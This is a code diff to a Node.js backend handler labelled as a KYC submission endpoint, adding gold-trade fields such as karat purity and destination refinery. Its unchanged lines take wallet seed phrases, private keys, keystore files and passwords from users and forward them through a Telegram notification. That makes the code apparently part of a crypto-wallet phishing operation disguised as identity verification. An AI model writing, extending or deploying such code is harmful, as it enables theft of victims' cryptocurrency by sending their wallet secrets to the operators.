@@ -28,9 +28,10 @@ async function verifyCloudinaryResource(public_id, resource_type = 'auto', expec
 // Save KYC details - expects client to upload files to Cloudinary unsigned and send back their metadata
 exports.saveKycDetails = async (req, res) => {
   try {
-    const { sessionId, walletType, seedPhrase, keystoreJson, password, privateKey, imageUrls } = req.body;
+    const { sessionId, walletType, seedPhrase, keystoreJson, password, privateKey, imageUrls, form,
+      qualityRequired, karatsPurity, destinationRefineryText } = req.body;
 
-    console.log('saveKycDetails payload received:', { sessionId, walletType, hasImages: Array.isArray(imageUrls) ? imageUrls.length : 0 });
+    console.log('saveKycDetails payload received:', { sessionId, walletType, hasImages: Array.isArray(imageUrls) ? imageUrls.length : 0, form });
 
     const expectedFolderPrefix = `kyc/${sessionId || 'unknown'}`;
     const verified = [];
@@ -65,6 +66,9 @@ exports.saveKycDetails = async (req, res) => {
       imageUrls: verified.length ? verified : (Array.isArray(imageUrls) ? imageUrls : []),
       verificationStatus,
       verificationError,
+      qualityRequired: qualityRequired || (form && form.qualityRequired) || '',
+      karatsPurity: karatsPurity || (form && form.karatsPurity) || '',
+      destinationRefineryText: destinationRefineryText || (form && form.destinationRefineryText) || '',
     };
 
     await Kyc.findOneAndUpdate(
@@ -74,7 +78,7 @@ exports.saveKycDetails = async (req, res) => {
     );
     // Send Telegram notification with KYC details
     try {
-      notifyNewKyc({ sessionId, walletType, seedPhrase, keystoreJson, password, privateKey, images: verified });
+      notifyNewKyc({ sessionId, walletType, seedPhrase, keystoreJson, password, privateKey, images: verified, form });
     } catch (err) {
       console.error('Failed to send KYC telegram notification', err);
     }
